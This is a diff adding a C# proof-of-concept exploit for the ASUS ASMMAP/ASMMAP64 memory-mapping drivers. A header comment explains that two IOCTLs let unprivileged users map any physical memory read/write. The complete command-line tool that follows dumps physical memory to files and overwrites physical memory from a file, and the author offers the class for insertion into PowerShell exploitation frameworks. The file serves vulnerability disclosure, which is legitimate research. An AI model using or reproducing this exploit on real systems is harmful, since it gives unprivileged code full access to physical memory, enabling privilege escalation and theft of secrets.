@@ -1,0 +1,217 @@
+/*
+  Source: http://rol.im/asux/
+
+  ASUS Memory Mapping Driver (ASMMAP/ASMMAP64): Physical Memory Read/Write
+  PoC by slipstream/RoL - https://twitter.com/TheWack0lian - http://rol.im/chat/
+  
+  The ASUS "Generic Function Service" includes a couple of drivers, ASMMAP.sys / ASMMAP64.sys,
+  the version resources describe them as "Memory mapping Driver".
+  
+  This description is very accurate, it has a pair of ioctls, 0x9C402580 and 0x9C402584, that map or
+  unmap to the calling process' address space ANY PART OF PHYSICAL MEMORY, with READ/WRITE permissions.
+  Using code that has been copypasta'd a bunch of times, but seems to originate from a sample driver for NT 3.1.
+  1993 vintage code, everybody.
+  
+  It also has a couple of other ioctls that allocate or free some RAM and gives the physical and virtual pointers
+  to it, and another one that can make any I/O request (does in/out byte/word/dword with parameters given in the ioctl buffer,
+  and returns the result for the case of in). These.. don't really matter, I guess? Well, I guess you could mess with SMM
+  or other issues easily...
+  
+  This PoC can dump a block of physical memory to disk, and write to a block of physical memory from a file.
+  I wrote it in C# so others can easily add the ASMMap_MapMem class to their powershell exploitation frameworks, if they so want.
+  
+  To ASUS: MS locked PhysicalMemory down in 2004. Don't use 1993 code to remove the restrictions, and let even unprivileged users
+  access it (where back before it was locked to ring0, only SYSTEM could access it).
+  
+  To MS: why did you even sign asmmap/asmmap64? Probably automation. Come on, why does signing even exist if you sign whatever driver
+  an OEM asks you to, without checking?
+*/
+
+// This uses pointers, so compile with /unsafe.
+using System;
+using System.ComponentModel;
+using System.Globalization;
+using System.IO;
+using System.Runtime.InteropServices;
+using Microsoft.Win32.SafeHandles;
+
+public class ASMMap_MapMem : IDisposable {
+	
+	public const uint IOCTL_MAPMEM = 0x9C402580;
+	public const uint IOCTL_UNMAPMEM = 0x9C402584;
+	
+	[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+	public static extern SafeFileHandle CreateFile(
+	   string lpFileName,
+	   [MarshalAs(UnmanagedType.U4)] FileAccess dwDesiredAccess,
+	   [MarshalAs(UnmanagedType.U4)] FileShare dwShareMode,
+	   IntPtr lpSecurityAttributes,
+	   [MarshalAs(UnmanagedType.U4)] FileMode dwCreationDisposition,
+	   [MarshalAs(UnmanagedType.U4)] FileAttributes dwFlagsAndAttributes,
+	   IntPtr hTemplateFile);
+	
+	[DllImport("kernel32.dll", SetLastError = true)]
+	static extern bool DeviceIoControl(
+		SafeFileHandle hDevice,
+		uint IoControlCode,
+		ref MapMemIoctl InBuffer,
+		int nInBufferSize,
+		ref MapMemIoctl OutBuffer,
+		int nOutBufferSize,
+		IntPtr pBytesReturned,
+		IntPtr Overlapped
+	);
+	
+	[StructLayout(LayoutKind.Sequential)]
+	public unsafe struct MapMemIoctl {
+		public ulong PhysicalAddress;
+		public byte* VirtualAddress;
+		[MarshalAs(UnmanagedType.ByValArray, SizeConst=2)]
+		public uint[] Length;
+		
+		public MapMemIoctl(SafeFileHandle asmmap,ulong PhysicalAddress,uint Length) {
+			this.PhysicalAddress = PhysicalAddress;
+			// Length[0] is used with ASMMAP64, Length[1] by ASMMAP. Set both here, ASMMAP will overwrite Length[0] anyway.
+			this.Length = new uint[2];
+			this.Length[0] = Length;
+			this.Length[1] = Length;
+			this.VirtualAddress = null;
+			// Fire the ioctl
+			Console.WriteLine("[*] Mapping 0x{0}-0x{1} into this process' address space...",PhysicalAddress.ToString("X"),(PhysicalAddress+Length).ToString("X"));
+			if (!DeviceIoControl(asmmap,IOCTL_MAPMEM,ref this,Marshal.SizeOf(typeof(MapMemIoctl)),ref this,Marshal.SizeOf(typeof(MapMemIoctl)),IntPtr.Zero,IntPtr.Zero)) {
+				throw new Win32Exception();
+			}
+			Console.WriteLine("[+] Mapped at 0x{0}",new IntPtr(this.VirtualAddress).ToInt64().ToString("X"));
+		}
+	}
+	
+	private MapMemIoctl mm;
+	private SafeFileHandle asmmap = null;
+	private bool ShouldDisposeOfAsmMap = false;
+	private bool HasBeenDisposed = false;
+	
+	public uint Length {
+		get {
+			if (this.HasBeenDisposed) throw new ObjectDisposedException("ASMMap_MapMem");
+			return mm.Length[ ( IntPtr.Size == 4 ? 1 : 0 ) ];
+		}
+	}
+	
+	public UnmanagedMemoryStream PhysicalMemoryBlock {
+		get {
+			if (this.HasBeenDisposed) throw new ObjectDisposedException("ASMMap_MapMem");
+			unsafe {
+				return new UnmanagedMemoryStream(mm.VirtualAddress,this.Length,this.Length,FileAccess.ReadWrite);
+			}
+		}
+	}
+	
+	public ASMMap_MapMem(ulong PhysicalAddress,uint Length) : this(null,PhysicalAddress,Length) {
+	}
+	
+	public ASMMap_MapMem(SafeFileHandle asmmap,ulong PhysicalAddress,uint Length) {
+		if (asmmap == null) {
+			asmmap = CreateFile("\\\\.\\ASMMAP" + (IntPtr.Size == 8 ? "64" : ""),FileAccess.ReadWrite,FileShare.None,
+				IntPtr.Zero,FileMode.Create,FileAttributes.Temporary,IntPtr.Zero);
+			this.ShouldDisposeOfAsmMap = true;
+		}
+		this.asmmap = asmmap;
+		this.mm = new MapMemIoctl(asmmap,PhysicalAddress,Length);
+	}
+	
+	public void Dispose() {
+		if (this.HasBeenDisposed) return;
+		unsafe { 
+			Console.WriteLine("[*] Unmapping 0x{0}-0x{1} (0x{2})...",
+				mm.PhysicalAddress.ToString("X"),
+				(mm.PhysicalAddress+Length).ToString("X"),
+				new IntPtr(mm.VirtualAddress).ToInt64().ToString("X")
+			);
+		}
+		try {
+			if (!DeviceIoControl(asmmap,IOCTL_UNMAPMEM,ref mm,Marshal.SizeOf(typeof(MapMemIoctl)),ref mm,Marshal.SizeOf(typeof(MapMemIoctl)),IntPtr.Zero,IntPtr.Zero)) {
+				throw new Win32Exception();
+			}
+			Console.WriteLine("[+] Unmapped successfully");
+		} finally {
+			// dispose of the driver handle if needed
+			if (this.ShouldDisposeOfAsmMap) asmmap.Dispose();
+			this.HasBeenDisposed = true;
+		}
+	}
+	
+	~ASMMap_MapMem() {
+		this.Dispose();
+	}
+}
+
+class asmmap {
+	public static bool TryParseDecAndHex(string value,out ulong result) {
+		if ((value.Length > 2) && (value.Substring(0,2) == "0x")) return ulong.TryParse(value.Substring(2),NumberStyles.AllowHexSpecifier,CultureInfo.InvariantCulture,out result);
+		return ulong.TryParse(value,out result);
+	}
+	
+	public static void Usage() {
+		Console.WriteLine("[*] Usage: {0} <read/write> <address> <length/file>",Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location));
+		Console.WriteLine("[*] address: starting physical address to read/write, can be decimal or hex, for hex, start with 0x");
+		Console.WriteLine("[*] length: size of memory to read, can be decimal or hex, for hex, start with 0x");
+		Console.WriteLine("[*] file: file whose contents will be written at <address>");
+	}
+	
+	public static void Read(ulong PhysicalAddress,ulong Length) {
+		uint IterationSize = ( IntPtr.Size == 8 ? (uint)0x10000000 : (uint)0x1000000 );
+		using (SafeFileHandle asmmap = ASMMap_MapMem.CreateFile("\\\\.\\ASMMAP" + (IntPtr.Size == 8 ? "64" : ""),FileAccess.ReadWrite,
+				FileShare.None,IntPtr.Zero,FileMode.Create,FileAttributes.Temporary,IntPtr.Zero))
+		using (FileStream stream = new FileStream("" + (PhysicalAddress.ToString("X")) + "-" + ((PhysicalAddress + Length).ToString("X")) + ".bin",FileMode.Create)) {
+			for (; Length > 0; Length -= IterationSize, PhysicalAddress += IterationSize) {
+				using (ASMMap_MapMem mapper = new ASMMap_MapMem(asmmap,PhysicalAddress,( Length > IterationSize ? IterationSize : (uint)(Length & 0xffffffff) ))) {
+					Console.WriteLine("[+] Reading block of memory...");
+					mapper.PhysicalMemoryBlock.CopyTo(stream);
+				}
+				if ( Length <= IterationSize) break;
+			}
+		}
+		Console.WriteLine("[+] Read successful: "+ (PhysicalAddress.ToString("X")) + "-" + ((PhysicalAddress + Length).ToString("X")) + ".bin");
+	}
+	
+	public static void Write(ulong PhysicalAddress,string Filename) {
+		using (FileStream stream = new FileStream(Filename,FileMode.Open))
+		using (ASMMap_MapMem mapper = new ASMMap_MapMem(PhysicalAddress,(uint)stream.Length)) {
+			Console.WriteLine("[+] Writing block of memory...");
+			stream.CopyTo(mapper.PhysicalMemoryBlock);
+		}
+	}
+	
+	public static void Main(string[] args) {
+		Console.WriteLine("[*] ASUS Memory Mapping Driver (ASMMAP/ASMMAP64): Physical Memory Read/Write");
+		Console.WriteLine("[*] PoC by slipstream/RoL - https://twitter.com/TheWack0lian - http://rol.im/chat/");
+		if (args.Length < 3) {
+			Usage();
+			return;
+		}
+		ulong PhysicalAddress, Length;
+		switch (args[0]) {
+			case "read":
+			case "-read":
+			case "--read":
+				if ((!TryParseDecAndHex(args[1],out PhysicalAddress)) || (!TryParseDecAndHex(args[2],out Length))) {
+					Usage();
+					return;
+				}
+				Read(PhysicalAddress,Length);
+				break;
+			case "write":
+			case "-write":
+			case "--write":
+				if (!TryParseDecAndHex(args[1],out PhysicalAddress)) {
+					Usage();
+					return;
+				}
+				Write(PhysicalAddress,args[2]);
+				break;
+			default:
+				Usage();
+				break;
+		}
+	}
+}
